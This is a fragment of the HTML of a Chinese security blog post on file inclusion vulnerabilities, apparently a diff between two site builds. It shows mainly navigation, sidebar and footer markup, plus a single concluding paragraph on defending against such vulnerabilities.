toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%88%AA%E6%96%AD"><span class="toc-number">11.</span> <span class="toc-text"> 文件包含截断</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#00%E6%88%AA%E6%96%AD"><span class="toc-number">11.1.</span> <span class="toc-text"> %00 截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B6%85%E9%95%BF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%88%AA%E6%96%AD"><span class="toc-number">11.2.</span> <span class="toc-text"> 超长文件包含截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%82%B9%E6%88%AA%E6%96%AD"><span class="toc-number">11.3.</span> <span class="toc-text"> 点截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%88%AA%E6%96%AD"><span class="toc-number">11.4.</span> <span class="toc-text"> &#x2F;. 截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB%E6%88%AA%E6%96%AD"><span class="toc-number">11.5.</span> <span class="toc-text"> 远程包含截断</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">12.</span> <span class="toc-text"> 防御</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li ><a href="/2023/10/28/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/" rel="bookmark" title="sql注入">sql注入</a></li><li  class="active"><a href="/2023/10/30/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" rel="bookmark" title="文件包含漏洞">文件包含漏洞</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="云逸" data-src="/assets/avatar.jpg"/><p class="name" itemprop="name">云逸</p><div class="description" itemprop="description"></div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">5</span><span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">9</span><span class="name">分类</span></a></div></nav><div class="social"><a href="https://gyzero1.github.io/" class="item github" rel="noopener" title="https:&#x2F;&#x2F;gyzero1.github.io&#x2F;" target="_blank"><i class="ic i-github"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-user"></i>关于</a><ul class="submenu"><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于本站</a></li><li class="item"><a href="/admiration/" rel="section"><i class="ic i-coffee"></i>赞赏博主</a></li></ul></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2023/10/30/network-security/neiwang/%E5%9F%9F%E7%8E%AF%E5%A2%83/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/network-security/" title="分类于网络安全">网络安全</a><i class="ic i-angle-right"></i><a href="/categories/network-security/neiwang/" title="分类于内网安全">内网安全</a></div><span><a href="/2023/10/30/network-security/neiwang/%E5%9F%9F%E7%8E%AF%E5%A2%83/">域环境</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/python/" title="分类于python">python</a><i class="ic i-angle-right"></i><a href="/categories/python/python%E5%9F%BA%E7%A1%80/" title="分类于python基础">python基础</a></div><span><a href="/2023/10/30/python%E5%BE%AA%E7%8E%AF/python%E5%BE%AA%E7%8E%AF/">python循环判断</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/network-security/" title="分类于网络安全">网络安全</a><i class="ic i-angle-right"></i><a href="/categories/network-security/Cloud-Security/" title="分类于云安全">云安全</a><i class="ic i-angle-right"></i><a href="/categories/network-security/Cloud-Security/docker/" title="分类于docker">docker</a></div><span><a href="/2023/10/27/%E6%BC%8F%E6%B4%9E/docker%E9%80%83%E9%80%B8/">docker逃逸</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/network-security/" title="分类于网络安全">网络安全</a><i class="ic i-angle-right"></i><a href="/categories/network-security/web-security/" title="分类于web安全">web安全</a><i class="ic i-angle-right"></i><a href="/categories/network-security/web-security/Basic-vulnerabilities/" title="分类于基础漏洞">基础漏洞</a><i class="ic i-angle-right"></i><a href="/categories/network-security/web-security/Basic-vulnerabilities/sql/" title="分类于sql注入">sql注入</a></div><span><a href="/2023/10/28/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/">sql注入</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/network-security/" title="分类于网络安全">网络安全</a><i class="ic i-angle-right"></i><a href="/categories/network-security/web-security/" title="分类于web安全">web安全</a><i class="ic i-angle-right"></i><a href="/categories/network-security/web-security/Basic-vulnerabilities/" title="分类于基础漏洞">基础漏洞</a></div><span><a href="/2023/10/30/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">文件包含漏洞</a></span></li></ul></div><div class="rpost pjax"><h2>最新评论</h2><ul class="leancloud-recent-comment" id="new-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2022 -<span itemprop="copyrightYear">2023</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">云逸 @ 云逸'bolg</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">22k 字</span><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">20 分钟</span></div><div class="powered-by">基于 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & Theme.<a href="https://github.com/theme-shoka-x/hexo-theme-shokaX/" rel="noopener" target="_blank">ShokaX</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
+<p>综上所述，文件包含漏洞的防御需要综合使用多种方法，包括输入验证、白名单控制、文件权限管理、安全配置和教育开发人员等措施。这些措施有助于降低文件包含漏洞对应用程序的风险。</p>
+</div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于</span><time title="修改时间：2023-10-31 08:11:41" itemprop="dateModified" datetime="2023-10-31T08:11:41+08:00">2023-10-31</time></span></div><div class="reward"><button><i class="ic i-heartbeat"></i>赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/assets/wechatpay.png" alt="云逸 微信支付"/><p>微信支付</p></div><div><img data-src="/assets/alipay.png" alt="云逸 支付宝"/><p>支付宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>云逸<i class="ic i-at"><em>@</em></i>云逸'bolg</li><li class="link"><strong>本文链接：</strong><a href="http://example.com/2023/10/30/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" title="文件包含漏洞">http://example.com/2023/10/30/漏洞/文件包含漏洞/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2023/10/30/network-security/neiwang/%E5%9F%9F%E7%8E%AF%E5%A2%83/" rel="prev" itemprop="url" data-background-image="https:&#x2F;&#x2F;tuchuang-1309689803.cos.ap-nanjing.myqcloud.com&#x2F;gyzero&#x2F;99.jpg" title="域环境"><span class="type">上一篇</span><span class="category"><i class="ic i-flag"></i>内网安全</span><h3>域环境</h3></a></div><div class="item right"></div></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text"> 常见文件包含函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text"> 代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8Cgetshell"><span class="toc-number">3.</span> <span class="toc-text"> 包含日志文件进行 getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E5%90%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshell"><span class="toc-number">4.</span> <span class="toc-text"> 配合文件上传漏洞 getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">5.</span> <span class="toc-text"> 伪协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpini%E8%AE%BE%E7%BD%AE"><span class="toc-number">6.</span> <span class="toc-text"> php.ini 设置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE%E7%94%A8%E6%B3%95"><span class="toc-number">7.</span> <span class="toc-text"> 协议用法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#phpinput"><span class="toc-number">7.1.</span> <span class="toc-text"> php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phpfile"><span class="toc-number">7.2.</span> <span class="toc-text"> php:&#x2F;&#x2F;file</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phpfilter"><span class="toc-number">7.3.</span> <span class="toc-text"> php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zip"><span class="toc-number">7.4.</span> <span class="toc-text"> zip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#data%E5%8D%8F%E8%AE%AE"><span class="toc-number">7.5.</span> <span class="toc-text"> data:&#x2F;&#x2F; 协议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B8%B8%E7%94%A8%E8%B7%AF%E5%BE%84"><span class="toc-number">8.</span> <span class="toc-text"> 文件包含常用路径</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-number">8.1.</span> <span class="toc-text"> 日志文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">8.2.</span> <span class="toc-text"> 网站配置文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">8.3.</span> <span class="toc-text"> 系统配置文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">9.</span> <span class="toc-text"> 远程文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%88%AA%E6%96%AD"><span class="toc-number">10.</span> <span class="toc-text"> 文件包含截断</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#00%E6%88%AA%E6%96%AD"><span class="toc-number">10.1.</span> <span class="toc-text"> %00 截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B6%85%E9%95%BF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%88%AA%E6%96%AD"><span class="toc-number">10.2.</span> <span class="toc-text"> 超长文件包含截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%82%B9%E6%88%AA%E6%96%AD"><span class="toc-number">10.3.</span> <span class="toc-text"> 点截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%88%AA%E6%96%AD"><span class="toc-number">10.4.</span> <span class="toc-text"> &#x2F;. 截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB%E6%88%AA%E6%96%AD"><span class="toc-number">10.5.</span> <span class="toc-text"> 远程包含截断</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">11.</span> <span class="toc-text"> 防御</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li ><a href="/2023/10/28/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/" rel="bookmark" title="sql注入">sql注入</a></li><li  class="active"><a href="/2023/10/30/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" rel="bookmark" title="文件包含漏洞">文件包含漏洞</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="云逸" data-src="/assets/avatar.jpg"/><p class="name" itemprop="name">云逸</p><div class="description" itemprop="description"></div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">5</span><span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">9</span><span class="name">分类</span></a></div></nav><div class="social"><a href="https://gyzero1.github.io/" class="item github" rel="noopener" title="https:&#x2F;&#x2F;gyzero1.github.io&#x2F;" target="_blank"><i class="ic i-github"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-user"></i>关于</a><ul class="submenu"><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于本站</a></li><li class="item"><a href="/admiration/" rel="section"><i class="ic i-coffee"></i>赞赏博主</a></li></ul></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2023/10/30/network-security/neiwang/%E5%9F%9F%E7%8E%AF%E5%A2%83/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/network-security/" title="分类于网络安全">网络安全</a><i class="ic i-angle-right"></i><a href="/categories/network-security/web-security/" title="分类于web安全">web安全</a><i class="ic i-angle-right"></i><a href="/categories/network-security/web-security/Basic-vulnerabilities/" title="分类于基础漏洞">基础漏洞</a></div><span><a href="/2023/10/30/%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">文件包含漏洞</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/python/" title="分类于python">python</a><i class="ic i-angle-right"></i><a href="/categories/python/python%E5%9F%BA%E7%A1%80/" title="分类于python基础">python基础</a></div><span><a href="/2023/10/30/python%E5%BE%AA%E7%8E%AF/python%E5%BE%AA%E7%8E%AF/">python循环判断</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/network-security/" title="分类于网络安全">网络安全</a><i class="ic i-angle-right"></i><a href="/categories/network-security/neiwang/" title="分类于内网安全">内网安全</a></div><span><a href="/2023/10/30/network-security/neiwang/%E5%9F%9F%E7%8E%AF%E5%A2%83/">域环境</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/network-security/" title="分类于网络安全">网络安全</a><i class="ic i-angle-right"></i><a href="/categories/network-security/web-security/" title="分类于web安全">web安全</a><i class="ic i-angle-right"></i><a href="/categories/network-security/web-security/Basic-vulnerabilities/" title="分类于基础漏洞">基础漏洞</a><i class="ic i-angle-right"></i><a href="/categories/network-security/web-security/Basic-vulnerabilities/sql/" title="分类于sql注入">sql注入</a></div><span><a href="/2023/10/28/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/">sql注入</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/network-security/" title="分类于网络安全">网络安全</a><i class="ic i-angle-right"></i><a href="/categories/network-security/Cloud-Security/" title="分类于云安全">云安全</a><i class="ic i-angle-right"></i><a href="/categories/network-security/Cloud-Security/docker/" title="分类于docker">docker</a></div><span><a href="/2023/10/27/%E6%BC%8F%E6%B4%9E/docker%E9%80%83%E9%80%B8/">docker逃逸</a></span></li></ul></div><div class="rpost pjax"><h2>最新评论</h2><ul class="leancloud-recent-comment" id="new-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2022 -<span itemprop="copyrightYear">2023</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">云逸 @ 云逸'bolg</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">21k 字</span><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">19 分钟</span></div><div class="powered-by">基于 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & Theme.<a href="https://github.com/theme-shoka-x/hexo-theme-shokaX/" rel="noopener" target="_blank">ShokaX</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
         path: `2023/10/30/漏洞/文件包含漏洞/`,
         favicon: {
         show: `（●´3｀●）やれやれだぜ`,
